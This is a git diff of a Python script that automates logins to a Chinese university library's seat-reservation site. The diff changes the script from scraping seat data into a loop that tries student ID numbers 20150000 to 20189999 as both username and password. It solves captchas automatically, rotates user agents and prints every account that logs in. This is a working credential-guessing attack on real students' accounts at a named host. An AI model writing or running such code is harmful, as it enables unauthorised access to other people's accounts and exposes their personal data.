@@ -1,9 +1,11 @@
 #!/usr/bin/env python
 # coding: utf-8
-# @Time     : 2018/10/16 21:12
+# @Time     : 2018/10/22 23:28
 # @Author   : toddlerya
-# @FileName : crawl_seats_info.py
+# @FileName : get_students_info.py.py
 # @Project  : MyZoneMySeat
+
+# from __future__ import unicode_literals
 
 
 import requests
@@ -103,50 +105,6 @@ class HljuLibrarySeat(object):
             is_down_ok = False
         return is_down_ok
 
-    def login(self, username, password):
-        post_data = {
-            'SYNCHRONIZER_TOKEN': self.token,
-            'SYNCHRONIZER_URI': '/login',
-            'username': username,
-            'password': password,
-            'captcha': input('[+] 请查看captcha.jpg, 输入验证码\n')
-        }
-        resp = self.s.post(url=login_url, data=post_data, headers=self.headers)
-        result = resp.content.decode('utf-8')
-        root = etree.HTML(result)
-        title = root.xpath("//title")[0].text
-        if (title == '自选座位 :: 图书馆空间预约系统'):
-            return True, '登录成功'
-        else:
-            return False, '登录失败'
-
-    # def get_seat_info(self, building='null', room='null', hour='null', startMin='null', endMin='null', offset=0, power='null', window='null', timeout=5.0):
-    def get_seat_info(self, offset=0):
-        seat_dict = dict()
-        resp = self.s.get(url=free_book_query_url + '?offset={N}'.format(N=offset), headers=self.headers)
-        seat_json = resp.json()
-        seat_count = seat_json['seatNum']
-        seat_str = seat_json['seatStr']
-        seat_page = seat_json['offset']
-        if seat_count == 0:
-            return False, seat_dict
-        free_seat_reg = '''//ul[@class="item"]/li'''
-        root = etree.HTML(seat_str)
-        seats_eles = root.xpath(free_seat_reg)
-        for seat in seats_eles:
-            raw_seat_id = seat.get('id')
-            try:
-                seat_id = raw_seat_id.split('_')[1]
-            except Exception as err:
-                self.log.logger.error('分割座位ID错误, MSG: %s', err)
-                sys.exit()
-            # seat_title = seat.get('title')
-            seat_num = seat.xpath('dl/dt')[0].text
-            seat_desc = seat.xpath('dl/dd')[0].text
-            # print(seat_id, type(seat_id), seat_title, type(seat_title), seat_num, type(seat_num))
-            seat_dict[seat_id] = [seat_num, seat_desc]
-        return True, seat_dict
-
     def get_seat_by_room(self, room_id):
         seat_dict = dict()
         resp = self.s.get(url=room_seat_map_url + '?room={N}'.format(N=room_id), headers=self.headers)
@@ -201,7 +159,6 @@ def captcha_verify(session_obj, threshold: int = 100):
             'DNT': '1',
             'Origin': 'http://seat1.lib.hlju.edu.cn',
             'Referer': 'http://seat1.lib.hlju.edu.cn/login?targetUri=%2F',
-            # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
             "User-Agent": choice(agents),
             "Cookie": session_obj.ck
         }
@@ -253,8 +210,11 @@ def auto_login(session_obj, username, password, threshold: int = 100):
         else:
             root = etree.HTML(result)
             title = root.xpath("//title")[0].text
+            msg_box = root.xpath('//*[@id="msgBoxDIV"]/span/text()')[0].strip()
             if (title == '自选座位 :: 图书馆空间预约系统'):
                 return True, session_obj
+            elif not msg_box:
+                print('=====>{}'.format(msg_box))
             else:
                 # 换个验证码继续干...
                 h.log.logger.warning('验证码校验不通过, 重新获取验证码!')
@@ -271,31 +231,25 @@ def auto_login(session_obj, username, password, threshold: int = 100):
 if __name__ == '__main__':
     sd = SeatDB()
     sd.init_seat_info_tb()
-
     h = HljuLibrarySeat()
-    login_status, h = auto_login(session_obj=h, username=username, password=password)
-    if login_status:
-        h.log.logger.info('登陆成功!')
-        h.log.logger.info('开始爬取所有座位信息...')
-        # flag = True
-        # all_seat_data = list()
-        # for offset in range(100):
-        #     if flag:
-        #         flag, seat_info_dict = h.get_seat_info(offset=offset)
-        #         for seat_id, seat_info in seat_info_dict.items():
-        #             temp_data = [seat_id, seat_info[0], seat_info[1]]
-        #             all_seat_data.append(temp_data)
-        # sd.load_seat_info(all_seat_data)
-        # ============= 采用第二种办法获取所有座位信息 =================
-        all_seat_data = list()
-        for room in room_desc_dict:
-            flag, seat_info_dict = h.get_seat_by_room(room_id=room)
-            for seat_id, seat_info in seat_info_dict.items():
-                temp_data = [seat_id, seat_info[0], seat_info[1]]
-                all_seat_data.append(temp_data)
-        sd.load_seat_info(all_seat_data)
-        h.log.logger.info('爬取数据入库完成')
-    else:
-        h.log.logger.error('请检查是否可以正常访问登录页面, 以及验证是否输入正确!')
+
+    for i in range(20150000, 20189999):
+        username = str(i)
+        password = str(i)
+        login_status, h = auto_login(session_obj=h, username=username, password=password)
+        if login_status:
+            h.log.logger.info('登陆成功!')
+            print(username)
+            # h.log.logger.info('开始爬取所有座位信息...')
+            # all_seat_data = list()
+            # for room in room_desc_dict:
+            #     flag, seat_info_dict = h.get_seat_by_room(room_id=room)
+            #     for seat_id, seat_info in seat_info_dict.items():
+            #         temp_data = [seat_id, seat_info[0], seat_info[1]]
+            #         all_seat_data.append(temp_data)
+            # sd.load_seat_info(all_seat_data)
+            # h.log.logger.info('爬取数据入库完成')
+        else:
+            h.log.logger.error('请检查是否可以正常访问登录页面, 以及验证是否输入正确!')
     sd.cur.close()
     sd.conn.close()
